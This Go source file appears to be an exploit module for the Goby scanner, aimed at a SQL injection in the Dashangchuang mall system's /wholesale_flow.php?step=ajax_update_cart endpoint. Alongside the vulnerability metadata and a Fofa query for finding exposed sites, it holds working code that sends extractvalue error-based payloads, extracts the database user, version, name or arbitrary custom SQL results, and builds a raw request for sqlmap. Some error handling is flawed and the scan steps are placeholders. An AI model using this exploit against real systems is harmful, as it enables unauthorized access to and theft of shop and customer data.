package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dashangchuang multi-user mall system /wholesale_flow.php?step=ajax_update_cart SQL Injection Vulnerability",
    "Description": "<p>Dashangchuang multi-user mall system is a powerful and flexible new retail e-commerce system service provider. The system supports platform self-operation and merchant settlement, realizes diversified business models, and can fully integrate industrial chain resources such as suppliers, manufacturers, distributors and consumers, improve product diversity, speed up capital flow, and help reduce unnecessary cost output. Dashangchuang multi-user mall system /wholesale_flow.phpj interface has a SQL injection vulnerability. Attackers can use this vulnerability to bypass the security mechanism of the application and execute unauthorized database commands, thereby accessing, stealing, modifying or deleting sensitive data stored in the database.</p>",
    "Product": "Da-Shang-Multi-Merchant-Mall-System",
    "Homepage": "https://www.dscmall.cn/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-11-14",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"大商创\"  || body=\"themes/ecmoban_dsc2017\"&& body=\"dsc-choie\"",
    "GobyQuery": "body=\"大商创\"  || body=\"themes/ecmoban_dsc2017\"&& body=\"dsc-choie\"",
    "Level": "2",
    "Impact": "<p>Dashangchuang multi-user mall system /wholesale_flow.phpj interface has a SQL injection vulnerability. Attackers can use this vulnerability to bypass the security mechanism of the application and execute unauthorized database commands, thereby accessing, stealing, modifying or deleting sensitive data stored in the database.</p>",
    "Recommendation": "<p>1. Pay attention to the manufacturer's official website and pay attention to updated information in a timely manner: <a href=\"https://www.dscmall.cn/\">https://www.dscmall.cn/</a> </p><p>2. Deploy a Web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E4%B8%8A%E6%B5%B7%E5%95%86%E5%88%9B/%E5%A4%A7%E5%95%86%E5%88%9B%E5%A4%9A%E7%94%A8%E6%88%B7%E5%95%86%E5%9F%8Ewholesale_flow.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "user(),version(),database()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "大商创多用户商城系统 /wholesale_flow.php?step=ajax_update_cart SQL 注入漏洞",
            "Product": "大商创多商户商城系统",
            "Description": "<p>大商创多用户商城系统是一个功能强大、灵活多变的新零售电商系统服务商。该系统支持平台自营和商家入驻，实现多元化经营模式，能够全面整合供应商、生产商、经销商和消费者等产业链资源，提高产品多样性，加快资金流动速度，并有助于减少不必要的成本输出。大商创多用户商城系统 /wholesale_flow.phpj接口存在sql注入漏洞，攻击者利用这种漏洞可以绕过应用程序的安全机制，执行未授权的数据库命令，从而访问、窃取、修改或删除数据库中存储的敏感数据。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"https://www.dscmall.cn/\">https://www.dscmall.cn/</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>大商创多用户商城系统 /wholesale_flow.phpj接口存在sql注入漏洞，攻击者利用这种漏洞可以绕过应用程序的安全机制，执行未授权的数据库命令，从而访问、窃取、修改或删除数据库中存储的敏感数据。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dashangchuang multi-user mall system /wholesale_flow.php?step=ajax_update_cart SQL Injection Vulnerability",
            "Product": "Da-Shang-Multi-Merchant-Mall-System",
            "Description": "<p>Dashangchuang multi-user mall system is a powerful and flexible new retail e-commerce system service provider. The system supports platform self-operation and merchant settlement, realizes diversified business models, and can fully integrate industrial chain resources such as suppliers, manufacturers, distributors and consumers, improve product diversity, speed up capital flow, and help reduce unnecessary cost output. Dashangchuang multi-user mall system /wholesale_flow.phpj interface has a SQL injection vulnerability. Attackers can use this vulnerability to bypass the security mechanism of the application and execute unauthorized database commands, thereby accessing, stealing, modifying or deleting sensitive data stored in the database.<br></p>",
            "Recommendation": "<p>1. Pay attention to the manufacturer's official website and pay attention to updated information in a timely manner: <a href=\"https://www.dscmall.cn/\">https://www.dscmall.cn/</a>&nbsp;</p><p>2. Deploy a Web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Dashangchuang multi-user mall system /wholesale_flow.phpj interface has a SQL injection vulnerability. Attackers can use this vulnerability to bypass the security mechanism of the application and execute unauthorized database commands, thereby accessing, stealing, modifying or deleting sensitive data stored in the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9971"
}`

	setSqlPayloadtXLgfmgedj := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulURL string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		headers := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		urlPost := "/wholesale_flow.php?step=ajax_update_cart"
		rawpayload := fmt.Sprintf("rec_ids[]=extractvalue(1,concat(0x7e,%s))", sql)

		resp, err = setPostRequest(hostInfo, urlPost, rawpayload, headers)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulURL = "/wholesale_flow.php?step=ajax_update_cart"

		return resp, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行16位的md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))[8:24]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "MD5(" + MD5ResultStr + ")"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadtXLgfmgedj
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0\nContent-Type: application/x-www-form-urlencoded\n\nrec_ids[]=1*}"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `syntax error: '~([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadtXLgfmgedj
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
